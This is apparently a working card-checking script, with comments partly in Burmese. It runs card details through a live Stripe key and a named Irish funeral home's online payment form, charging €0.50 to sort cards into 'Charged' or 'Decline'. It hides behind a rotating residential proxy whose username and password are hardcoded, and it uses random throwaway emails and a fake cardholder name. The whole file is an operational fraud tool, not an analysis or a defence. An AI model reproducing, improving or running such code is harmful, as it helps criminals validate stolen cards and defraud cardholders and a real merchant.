import requests, re
import random
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ==========================================
# 👇 PROXY SETTINGS (US Virginia Beach 🇺🇸 + Auto Retry)
# ==========================================
PROXY_HOST = 'geo.g-w.info'
PROXY_PORT = '10080'

# 🔥 မင်းရဲ့ Proxy User/Pass
PROXY_USER = 'user-7xkEOw8bXcNNWHHW-type-residential-session-mktef1si-country-US-city-Virginia_Beach-rotation-15'
PROXY_PASS = 'CMvQFPYozpgFTlXC'

# Proxy String
proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {
    'http': proxy_url,
    'https': proxy_url
}

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]

        if "20" in yy:
            yy = yy.split("20")[1]

        letters = string.ascii_lowercase + string.digits
        random_name = ''.join(random.choice(letters) for i in range(10))
        random_email = f"{random_name}@gmail.com"

        # 🔥 RETRY SYSTEM
        session = requests.Session()
        retry = Retry(connect=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.proxies = proxies

        # ==========================================
        # Step 1: Create Payment Method (Stripe)
        # ==========================================
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        # Note: { ,n } ကို { n } လို့ ပြင်ထားတယ်
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51IGU0GIHh0fd2MZ32oi6r6NEUMy1GP19UVxwpXGlx3VagMJJOS0EM4e6moTZ4TUCFdX2HLlqns5dQJEx42rvhlfg003wK95g5r'

        response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            timeout=40 
        )

        if 'id' not in response.json():
            return "Proxy Error (PM Failed) ❌"
            
        pm = response.json()['id']

        # ==========================================
        # Step 2: Charge Request (Corrigan Funerals)
        # ==========================================
        headers = {
            'authority': 'www.corriganfunerals.ie',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.corriganfunerals.ie',
            'referer': 'https://www.corriganfunerals.ie/pay-funeral-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'pay-funeral-account',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.5',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-custom-input[]': [
                'zero',
                'Street 2',
                '13125550124',
            ],
            'wpfs-card-holder-email': random_email, 
            'wpfs-card-holder-name': 'Noe Z',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }

        response = session.post(
            'https://www.corriganfunerals.ie/cfajax',
            headers=headers,
            data=data,
            timeout=40
        )
        
        # ==========================================
        # 🔥 IMPROVED RESULT CHECK (Live မလွတ်အောင် ပြင်ထားသည်)
        # ==========================================
        try:
            resp_json = response.json()
            
            # ၁။ Success ဖြစ်လား အရင်စစ်မယ် (Live ဆိုရင် Message မပါလည်း Live ပဲ)
            if resp_json.get('success') == True:
                result = "Charged 0.5€ ✅"
            
            # ၂။ Success မဟုတ်မှ Message ကို လိုက်ရှာမယ်
            else:
                result = resp_json.get('message', 'Decline⛔')

        except:
            if "Cloudflare" in response.text or response.status_code == 403:
                result = "IP Blocked by Site ❌"
            else:
                result = "Decline⛔"

    except Exception as e:
        result = f"Connection Failed (Retry Limit) ⚠️"
        
    return result
